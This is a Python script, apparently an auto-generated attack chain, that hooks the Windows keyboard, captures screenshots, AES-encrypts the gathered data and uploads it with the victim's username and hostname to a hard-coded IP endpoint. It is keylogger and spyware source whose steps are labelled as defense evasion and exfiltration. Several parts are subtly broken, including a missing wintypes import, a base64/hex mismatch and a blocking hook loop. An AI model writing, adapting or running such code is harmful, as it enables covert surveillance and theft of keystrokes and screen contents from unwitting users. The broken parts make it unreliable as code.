#!/usr/bin/env python3
import sys, json, time, base64, os, socket, requests
from typing import Dict, Any
from io import BytesIO
from PIL import ImageGrab
import ctypes
import threading
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
from requests.exceptions import ConnectionError, Timeout

# Constants for the hook
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100

# Define the LowLevelKeyboardProc callback function type
LowLevelKeyboardProc = ctypes.WINFUNCTYPE(
    ctypes.c_long,
    ctypes.c_int,
    ctypes.wintypes.WPARAM,
    ctypes.wintypes.LPARAM
)

# Store the hook ID globally
hook_id = None

def keyboard_proc(nCode, wParam, lParam):
    if wParam == WM_KEYDOWN:
        # Extract the virtual key code from lParam
        vk_code = ctypes.cast(lParam, ctypes.POINTER(ctypes.wintypes.DWORD)).contents.value
        print(f"Key pressed: {vk_code}")
    return ctypes.windll.user32.CallNextHookEx(hook_id, nCode, wParam, lParam)

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    global hook_id
    try:
        # Set the hook
        hook_id = ctypes.windll.user32.SetWindowsHookExW(
            WH_KEYBOARD_LL,
            LowLevelKeyboardProc(keyboard_proc),
            ctypes.windll.kernel32.GetModuleHandleW(None),
            0
        )

        if not hook_id:
            return {'success': True, 'data': {'hook_id': None, 'active': False},
                    'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

        # Message loop to keep the hook active
        msg = ctypes.wintypes.MSG()
        while ctypes.windll.user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
            ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
            ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))

        return {'success': True, 'data': {'hook_id': hook_id, 'active': True},
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def capture_screenshot() -> bytes:
    """Capture a screenshot and return it as a base64 encoded string."""
    try:
        screenshot = ImageGrab.grab()
        buffer = BytesIO()
        screenshot.save(buffer, format='PNG')
        return base64.b64encode(buffer.getvalue()).decode()
    except Exception as e:
        return None

def keyboard_hook():
    """Set up a low-level keyboard hook."""
    WH_KEYBOARD_LL = 13
    WM_KEYDOWN = 0x0100

    def low_level_keyboard_proc(nCode, wParam, lParam):
        if wParam == WM_KEYDOWN:
            # Process key press here if needed
            pass
        return ctypes.windll.user32.CallNextHookEx(hook_id, nCode, wParam, lParam)

    hook_proc = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int, ctypes.c_ulong, ctypes.POINTER(ctypes.c_void_p))(low_level_keyboard_proc)
    hook_id = ctypes.windll.user32.SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, ctypes.windll.kernel32.GetModuleHandleW(None), 0)

    if not hook_id:
        return False

    msg = ctypes.wintypes.MSG()
    while ctypes.windll.user32.GetMessageA(ctypes.byref(msg), None, 0, 0) != 0:
        ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
        ctypes.windll.user32.DispatchMessageA(ctypes.byref(msg))

    return True

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Start the keyboard hook in a separate thread
        threading.Thread(target=keyboard_hook, daemon=True).start()

        # Capture the screenshot
        image_data = capture_screenshot()
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())

        result = {
            'image_data': image_data,
            'timestamp': timestamp
        }
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Extract input data
        hook_id = input_data.get('hook_id')
        active = input_data.get('active')
        image_data = bytes.fromhex(input_data.get('image_data', ''))
        timestamp = input_data.get('timestamp')

        # Prepare entries list
        entries = []

        # Add keystroke data if active
        if active:
            entries.append({
                'type': 'keystroke',
                'hook_id': hook_id,
                'timestamp': timestamp
            })

        # Add screenshot data
        entries.append({
            'type': 'screenshot',
            'image_data': image_data.hex(),
            'timestamp': timestamp
        })

        # Prepare result
        result = {
            'entries': entries,
            'count': len(entries)
        }

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        # Return partial result on failure
        return {'success': False, 'data': {'entries': [], 'count': 0},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Extract entries and count from input_data
        entries = input_data.get('entries', [])
        count = input_data.get('count', 0)

        # Convert entries to a single bytes object
        plaintext = json.dumps(entries).encode()

        # Generate random key and IV
        key = get_random_bytes(16)
        iv = os.urandom(16)

        # Create AES cipher in CBC mode
        cipher = AES.new(key, AES.MODE_CBC, iv)

        # Pad plaintext to 16-byte boundary and encrypt
        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

        # Prepare result with hex-encoded fields
        result = {
            'ciphertext': ciphertext.hex(),
            'iv': iv.hex(),
            'key': key.hex()
        }

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
    except Exception as e:
        # Return partial result with encoded=False on failure
        return {'success': False, 'data': {'ciphertext': None, 'iv': None, 'key': None},
                'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}

def task_T5(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Extract and convert input data
        ciphertext = bytes.fromhex(input_data.get('ciphertext', ''))
        iv = bytes.fromhex(input_data.get('iv', ''))
        key = bytes.fromhex(input_data.get('key', ''))

        # Prepare system information
        username = os.environ.get('USERNAME', 'unknown')
        hostname = socket.gethostname()

        # Prepare payload
        payload = {
            'ciphertext': ciphertext.hex(),
            'iv': iv.hex(),
            'key': key.hex(),
            'username': username,
            'hostname': hostname
        }

        # Define the target URL
        url = "https://192.168.129.197/api"

        # Attempt to send data with retries
        success = False
        for _ in range(3):
            try:
                response = requests.post(url, json=payload, timeout=10, verify=False)
                if response.status_code == 200:
                    success = True
                    break
            except (ConnectionError, Timeout):
                time.sleep(5)

        result = {'success': success}
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T5', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T5', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Hook Keyboard [execution] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Hook Keyboard): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Hook Keyboard): FAILED — {err}')
            failed.append('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T2: Capture Screenshots [execution] ──
    try:
        r = task_T2(None)
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Capture Screenshots): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Capture Screenshots): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Buffer Data [data-processing] ──
    try:
        _inp = {}
        _inp.update(outputs.get('T1', {}))
        _inp.update(outputs.get('T2', {}))
        r = task_T3(_inp)
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Buffer Data): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Buffer Data): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    # ── T4: Encrypt Data [defense-evasion] ──
    try:
        r = task_T4(outputs.get('T3', {}))
        results['T4'] = r
        if r.get('success'):
            outputs['T4'] = r.get('data', {})
            print(f'[+] T4 (Encrypt Data): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T4 (Encrypt Data): FAILED — {err}')
            failed.append('T4')
    except Exception as e:
        print(f'[!] T4 crashed: {e}')
        failed.append('T4')
        results['T4'] = {'success': False, 'error': str(e)}
    
    # ── T5: Upload Data [exfiltration] ──
    try:
        r = task_T5(outputs.get('T4', {}))
        results['T5'] = r
        if r.get('success'):
            outputs['T5'] = r.get('data', {})
            print(f'[+] T5 (Upload Data): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T5 (Upload Data): FAILED — {err}')
            failed.append('T5')
            r2 = task_T5(outputs.get('T4', {}))
            if r2.get('success'):
                outputs['T5'] = r2.get('data', {})
                failed.remove('T5')
    except Exception as e:
        print(f'[!] T5 crashed: {e}')
        failed.append('T5')
        results['T5'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))